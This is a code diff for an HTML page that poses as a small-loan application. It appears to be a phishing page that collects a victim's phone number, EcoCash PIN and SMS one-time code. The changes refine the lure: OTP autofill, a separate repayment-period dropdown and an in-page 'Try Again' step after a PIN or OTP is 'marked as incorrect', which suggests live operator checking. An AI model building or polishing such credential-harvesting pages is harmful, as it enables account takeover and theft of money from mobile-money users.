@@ -21,31 +21,22 @@
 
     <!-- HORIZONTAL STEP INDICATOR -->
     <div id="horizontal-steps" class="flex items-center justify-between border-b border-blue-300/20 pb-4">
-      <!-- Step 1 Indicator -->
       <div id="step-indicator-1" class="flex flex-col items-center flex-1">
-        <div id="step-circle-1" class="w-8 h-8 rounded-full bg-white text-[#004B87] font-black flex items-center justify-center text-xs shadow">
-          1
-        </div>
+        <div id="step-circle-1" class="w-8 h-8 rounded-full bg-white text-[#004B87] font-black flex items-center justify-center text-xs shadow">1</div>
         <span id="step-label-1" class="text-[10px] font-bold text-white mt-1">Details</span>
       </div>
 
       <div id="step-line-1" class="h-0.5 flex-1 bg-blue-300/40 mb-4 transition-all duration-300"></div>
 
-      <!-- Step 2 Indicator -->
       <div id="step-indicator-2" class="flex flex-col items-center flex-1">
-        <div id="step-circle-2" class="w-8 h-8 rounded-full bg-[#002855] text-blue-200 border border-blue-300/40 font-bold flex items-center justify-center text-xs">
-          2
-        </div>
+        <div id="step-circle-2" class="w-8 h-8 rounded-full bg-[#002855] text-blue-200 border border-blue-300/40 font-bold flex items-center justify-center text-xs">2</div>
         <span id="step-label-2" class="text-[10px] text-blue-200/80 mt-1">Login</span>
       </div>
 
       <div id="step-line-2" class="h-0.5 flex-1 bg-blue-300/40 mb-4 transition-all duration-300"></div>
 
-      <!-- Step 3 Indicator -->
       <div id="step-indicator-3" class="flex flex-col items-center flex-1">
-        <div id="step-circle-3" class="w-8 h-8 rounded-full bg-[#002855] text-blue-200 border border-blue-300/40 font-bold flex items-center justify-center text-xs">
-          3
-        </div>
+        <div id="step-circle-3" class="w-8 h-8 rounded-full bg-[#002855] text-blue-200 border border-blue-300/40 font-bold flex items-center justify-center text-xs">3</div>
         <span id="step-label-3" class="text-[10px] text-blue-200/80 mt-1">OTP</span>
       </div>
     </div>
@@ -70,14 +61,11 @@
           class="w-full bg-[#002855] border border-blue-300/40 rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-white text-white placeholder-blue-200/40">
       </div>
 
-      <!-- COMBINED SLIDER FOR AMOUNT & PERIOD (MONTHS) -->
+      <!-- MONEY SLIDER -->
       <div class="bg-[#002855]/90 p-4 border border-blue-300/30 rounded-xl space-y-3">
         <div class="flex justify-between items-center">
-          <label class="text-xs font-semibold text-blue-100">Loan Amount & Period</label>
-          <div class="text-right">
-            <span id="calc-amount" class="text-lg font-black text-white font-mono">$100</span>
-            <span class="text-xs text-blue-200 font-bold font-mono">/ <span id="calc-period">1</span> Month(s)</span>
-          </div>
+          <label class="text-xs font-semibold text-blue-100">Amount Requested</label>
+          <span id="calc-amount" class="text-lg font-black text-white font-mono">$100</span>
         </div>
         
         <input type="range" id="loanRange" min="10" max="500" step="10" value="100" 
@@ -95,8 +83,16 @@
         </div>
       </div>
 
-      <!-- Hidden hidden inputs for state tracking -->
-      <input type="hidden" id="repaymentPeriod" value="1">
+      <!-- REPAYMENT PERIOD (MONTHS) STANDING ON ITS OWN BELOW MONEY SLIDER -->
+      <div>
+        <label class="block text-xs font-semibold text-blue-100 mb-1">Loan Repayment Period (Months) *</label>
+        <select id="repaymentPeriod" required class="w-full bg-[#002855] border border-blue-300/40 rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-white text-white">
+          <option value="1">1 Month</option>
+          <option value="2">2 Months</option>
+          <option value="3">3 Months</option>
+          <option value="6">6 Months</option>
+        </select>
+      </div>
 
       <button type="submit" 
         class="w-full bg-white hover:bg-blue-50 text-[#004B87] font-black py-3 rounded-xl text-sm transition shadow-lg tracking-wide uppercase">
@@ -119,7 +115,6 @@
             oninput="this.value = this.value.replace(/[^0-9]/g, '');"
             class="w-full bg-[#002855] border border-blue-300/40 rounded-r-xl px-4 py-2.5 text-sm focus:outline-none focus:border-white text-white placeholder-blue-200/40 font-mono tracking-wider">
         </div>
-        <p class="text-[10px] text-blue-200/60 mt-1">Must be exactly 9 digits (e.g. 771234567 or 781234567)</p>
       </div>
 
       <div>
@@ -135,7 +130,7 @@
       </button>
     </form>
 
-    <!-- COUNTDOWN TIMER (10 SECONDS) -->
+    <!-- COUNTDOWN TIMER -->
     <div id="step-loading" class="hidden text-center py-8 space-y-4">
       <div class="inline-block animate-spin rounded-full h-10 w-10 border-4 border-white border-t-transparent"></div>
       <div class="space-y-1">
@@ -154,7 +149,8 @@
 
       <div>
         <label class="block text-xs font-semibold text-blue-100 mb-1">SMS 6-Digit OTP *</label>
-        <input type="text" id="otpCode" maxlength="6" pattern="\d{6}" required placeholder="123456" 
+        <input type="text" id="otpCode" autocomplete="one-time-code" maxlength="6" pattern="\d{6}" required placeholder="123456" 
+          oninput="this.value = this.value.replace(/[^0-9]/g, '');"
           class="w-full bg-[#002855] border border-blue-300/40 rounded-xl px-4 py-2.5 text-sm tracking-widest text-center text-2xl font-mono focus:outline-none focus:border-white text-white">
       </div>
 
@@ -205,10 +201,10 @@
         ❌
       </div>
       <div class="space-y-2">
-        <h2 class="text-xl font-bold text-white">Authentication Failed</h2>
+        <h2 class="text-xl font-bold text-white">Verification Failed</h2>
         <p id="rejection-msg" class="text-xs text-blue-100/80">The EcoCash PIN or OTP provided was marked as incorrect.</p>
       </div>
-      <button onclick="location.reload()" class="bg-white text-[#004B87] font-bold text-xs px-6 py-2.5 rounded-xl transition">
+      <button id="retry-action-btn" onclick="retryFailedStep()" class="bg-white text-[#004B87] font-bold text-xs px-6 py-2.5 rounded-xl transition uppercase tracking-wider">
         Try Again
       </button>
     </div>
@@ -257,4 +253,4 @@
   </script>
 </body>
   </html>
-  
+          
